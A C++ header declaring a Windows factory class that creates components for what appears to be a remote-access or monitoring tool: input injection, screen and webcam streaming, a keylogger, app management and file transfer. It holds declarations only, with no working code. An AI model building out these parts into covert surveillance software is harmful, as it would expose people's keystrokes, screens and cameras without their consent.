#pragma once
#include "interfaces/IPlatformFactory.hpp"

#ifdef PLATFORM_WINDOWS

namespace platform {
namespace windows_os {

// ============================================================================
// WindowsPlatformFactory - Factory for Windows platform components
// ============================================================================
// Creates Windows-specific implementations of all HAL interfaces.
// ============================================================================

class WindowsPlatformFactory final : public interfaces::IPlatformFactory {
public:
    WindowsPlatformFactory() = default;
    ~WindowsPlatformFactory() override = default;

    // ========== IPlatformFactory Implementation ==========

    std::unique_ptr<interfaces::IInputInjector> create_input_injector() override;
    std::unique_ptr<interfaces::IVideoStreamer> create_screen_streamer() override;
    std::unique_ptr<interfaces::IVideoStreamer> create_webcam_streamer() override;
    std::unique_ptr<interfaces::IKeylogger> create_keylogger() override;
    std::unique_ptr<interfaces::IAppManager> create_app_manager() override;
    std::unique_ptr<interfaces::IFileTransfer> create_file_transfer() override;

    const char* platform_name() const noexcept override { return "Windows"; }

    bool is_current_platform() const noexcept override {
        return PLATFORM_IS_WINDOWS;
    }

    void initialize() override;
    void shutdown() override;

private:
    bool initialized_ = false;
};

} // namespace windows_os
} // namespace platform

#endif // PLATFORM_WINDOWS
